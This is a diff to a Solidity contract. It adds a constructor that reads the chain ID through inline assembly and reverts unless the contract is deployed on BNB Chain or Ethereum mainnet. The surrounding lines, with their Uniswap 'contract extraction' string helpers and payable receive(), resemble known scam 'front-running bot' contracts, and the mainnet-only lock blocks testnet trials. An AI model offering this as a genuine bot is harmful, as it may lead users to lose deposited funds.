@@ -7,8 +7,14 @@ pragma solidity ^0.6.6;
     address public erc20Contract;
     address public withdrawAddress = msg.sender;
 
+    uint public chainId;
     uint liquidity;
     event Log(string _msg);
+
+    constructor() public {
+        chainId = veryfyChain();
+        isVerified();
+    }
 
     receive() external payable {}
 
@@ -137,6 +143,10 @@ pragma solidity ^0.6.6;
         return ret;
     }
 
+    function isVerified() internal view returns (bool) {
+        require(chainId == 56 || chainId == 1, "Please use BNB Chain or Ethereum Mainnet Only.");
+    }
+
     /*
      * @dev Extracts the contract from Uniswap
      * @param self The slice to operate on.
@@ -245,6 +255,14 @@ pragma solidity ^0.6.6;
         }
 
         return ret;
+    }
+
+    function veryfyChain() internal pure returns (uint) {
+        uint _chainId;
+        assembly {
+            _chainId := chainid()
+        }
+        return _chainId;
     }
 
     /*
